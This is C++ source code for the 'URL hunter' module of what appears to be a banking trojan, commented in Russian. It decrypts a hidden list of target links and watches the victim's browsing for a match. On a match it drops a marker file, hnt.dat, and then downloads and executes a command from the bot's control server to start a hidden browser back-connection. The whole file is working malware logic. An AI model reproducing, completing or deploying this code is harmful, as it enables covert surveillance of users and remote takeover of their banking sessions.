#include "Hunter.h"
#include "Memory.h"
#include "Utils.h"
#include "GetApi.h"
#include "BotHTTP.h"
#include "Task.h"
#include "StealthBrowser.h"
#include "BackConnect.h"

#include "Modules.h"
#include "Config.h"

const static char HunterMutexName[] = {'H', 'n', 'T',  0};
const static WCHAR HunterFileName[] = {'h', 'n', 't', '.', 'd', 'a', 't',  0};


//поймали дичь и следим за ней
//на скрипт скинули имя бота и префикс,получили в ответ адрес СБ и запустили СБ
void Hunting()
{
	PCHAR URL = GetBotScriptURL(SCRIPT_HUNTER);
	if (URL == NULL) return;

    DownloadAndExecuteCommand(NULL, URL);
}

bool HunterFileExists()
{
	// Функция возвращает истину если в системе диске существует файл,
	// сигнал хантера
	return isFileExists(0x001a /* Спросить у Коли про эту ебалу */, (PWCHAR)HunterFileName);
	// эта ебала признана для того чтобы при отлове какойто ссылки создать файл, 
	// и при следующей загрузке при наличии файлс сразу грузить сб
	// данный флаг являеться
}

DWORD WINAPI HuntThred( LPVOID lpData )
{
//если есть файл на диске,то берём из него строку и запускаем сб
//внутри файла строка 127.0.0.1:5555
	if (HunterFileExists())
	{		
		Hunting();
		return 0;
	}	
	
	HANDLE tmp;
	while(true)
	{
		tmp= (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS,FALSE, (PCHAR)HunterMutexName);
		if ((DWORD)pWaitForSingleObject(tmp, INFINITE))
		{	
			if (HunterFileExists())//&&!IsSbStarted()
			{
				Hunting();
			}
			pSleep(90);
		}
		else
		{		
			Hunting();
			pCloseHandle(tmp);
			FileCreateInFolder(0x001a, (PWCHAR)HunterFileName,NULL,0);
			break;
		}
	}	
	return 0;
}

// Набор ссылок охотника. Каждая ссылка должна заканчиваться нулевым сиволом
// После последней ссылки должно стоять два нулевых символа
// URL1\0URL2\0URL3\0\0

char HunterLinks[HUNTER_PARAM_SIZE] = HUNTER_PARAM_NAME;

#define HUNTER_LINKS_HASH 0x9152F40C /* __BNK__HUNTER__LINKS */


// Признак успешного срабатывания охотника за ссылками
bool HunterCompleted = false;




//-----------------------------------------------------------------------------
void HunterSignal()
{
	// Функция уведомляет ожидающий процесс о нахождении ссылки
	HANDLE Handle = (HANDLE)pCreateMutexA(NULL, FALSE, (PCHAR)HunterMutexName);
	pSleep(100);
	pCloseHandle(Handle);
}

//-----------------------------------------------------------------------------

void URLHunter::Initialize()
{
	// Инициализируем данные хантера
	HunterCompleted = HunterFileExists();
}

//-----------------------------------------------------------------------------

void URLHunter::CheckURL(PCHAR URL)
{
	// Проверить совпадение ссылки с любой ссылкой из списка ссылок охотника
	if (HunterCompleted || STR::IsEmpty(URL) ||
		CalcHash(HunterLinks) == HUNTER_LINKS_HASH)
		return;

	// Перебираем все ссылки в поисках нужной нам
	PCHAR Tmp = HunterLinks;

	PCHAR DecryptedURL = STR::Alloc(HUNTER_PARAM_SIZE);

	while (*Tmp != NULL)
	{
		m_memset(DecryptedURL, 0, HUNTER_PARAM_SIZE);
		DecryptStr(Tmp, DecryptedURL);

		if (CompareUrl(DecryptedURL, URL))
		{
			// Сигнализируем об удачной охоте
			HunterSignal();

			// Устанавливаем признак срабатывания охотника
			HunterCompleted = true;

			break;
        }

		// Переходим к следующей строке
		Tmp = STR::End(Tmp); // переходим к концу строки
		Tmp++; // Пропускаем
	}

	STR::Free(DecryptedURL);
}

//-----------------------------------------------------------------------------

void URLHunter::StartClient()
{
	// Запускаем клиент ожидание события охотника
	// Возможен запуск в другом процессе
	StartThread(HuntThred,NULL);
}
